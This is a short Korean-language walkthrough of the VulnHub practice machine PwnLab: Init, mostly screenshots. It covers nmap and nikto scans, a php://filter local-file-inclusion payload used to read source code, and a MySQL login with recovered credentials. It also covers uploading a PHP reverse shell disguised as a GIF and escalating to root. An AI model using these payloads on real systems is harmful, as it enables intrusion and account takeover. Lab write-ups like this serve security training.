[PWNLAB: INIT](https://www.vulnhub.com/entry/pwnlab-init,158/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open
![1](https://user-images.githubusercontent.com/69203345/110316352-f4090100-804d-11eb-9241-633f5acb7aff.PNG)

# enumerate + exploitation
***
## target: 192.168.25.13
### nmap -O -sV -sS -p- 192.168.25.13
![2](https://user-images.githubusercontent.com/69203345/110316484-23b80900-804e-11eb-9484-f4952655374c.PNG)
### nikto -C all -h http://192.168.25.13     
![3](https://user-images.githubusercontent.com/69203345/110316823-9d4ff700-804e-11eb-9166-384a1bef9d2f.PNG)       
![4](https://user-images.githubusercontent.com/69203345/110317335-57476300-804f-11eb-89df-5eafabdce4a8.PNG)       
아무것도 없음....          
#### LFI시도 
![5](https://user-images.githubusercontent.com/69203345/110317414-79d97c00-804f-11eb-9e81-159682ed538b.PNG)         
base64 디코딩     
![6](https://user-images.githubusercontent.com/69203345/110317565-ad1c0b00-804f-11eb-89ed-2d6125094972.PNG)       
### mysql -h 192.168.25.13 -u root -p
![7](https://user-images.githubusercontent.com/69203345/110318070-5f53d280-8050-11eb-9b4d-ab4e3f6f201c.PNG)         
![8](https://user-images.githubusercontent.com/69203345/110318279-a5109b00-8050-11eb-93b2-4f2174cb4e70.PNG)       
base64 디코딩     
![9](https://user-images.githubusercontent.com/69203345/110318572-fc167000-8050-11eb-8c2d-5de21f7ffd69.PNG)
#### 192.168.25.13/?page=php://filter/convert.base64-encode/resource=upload
![10](https://user-images.githubusercontent.com/69203345/110318747-3718a380-8051-11eb-8528-412d56c0d0a3.PNG)       
짤렸지만 긺... 무지 긺...      
.jpg",".jpeg",".gif",".png 이 파일만 업로드 가능       
알아낸 아이디 비밀번호 로그인         
$ cp /usr/share/webshells/php/php-reverse-shell.php ./      
$ mv php-reverse-shell.php shell.gif      
+ 맨 첫째줄에 GIF98 추가 해주도록 하자      
업로드 페이지 업로드 후 소스코드    
![11](https://user-images.githubusercontent.com/69203345/110320179-44cf2880-8053-11eb-8b40-a4fb76b4087f.PNG)      
burfsuite 에 입력       
![12](https://user-images.githubusercontent.com/69203345/110322091-f0797800-8055-11eb-8361-0e0da01dbbdc.PNG)      
접속된걸 볼수 있다       
![13](https://user-images.githubusercontent.com/69203345/110322181-0edf7380-8056-11eb-8cdf-256610636b60.PNG)        

#### 192.168.25.13

# privilege escalation 
***   
kane으로 접속후 msgmike 실행      
![14](https://user-images.githubusercontent.com/69203345/110322500-90370600-8056-11eb-8c09-00995ec68eec.PNG)         
이대로 쳐주자     
![15](https://user-images.githubusercontent.com/69203345/110323175-94afee80-8057-11eb-93a8-fbc01e0ff8e6.PNG)      
![16](https://user-images.githubusercontent.com/69203345/110323956-ae9e0100-8058-11eb-8ee6-f9ce8ef183c7.PNG)
ㄲ-ㅌ

root획득   
꼭 이방법만 있는것은 아니다.
으악.
***
https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/          
https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/
